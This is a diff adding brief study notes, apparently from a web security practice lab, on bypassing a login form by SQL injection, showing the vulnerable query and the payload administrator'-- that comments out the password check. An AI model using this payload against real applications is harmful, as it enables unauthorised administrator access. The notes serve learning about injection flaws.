@@ -1,0 +1,10 @@
+SQL injection => Login Functionallity
+
+End Goal =>  perform a SQL injection attack that logs in to the application as the administrator user.
+
+Anaylsis
+SELECT * FROM users where username='' AND password=''
+
+"SELECT * FROM users where username='administrator'--' AND password=''" => hack
+
+payload is => administrator'--
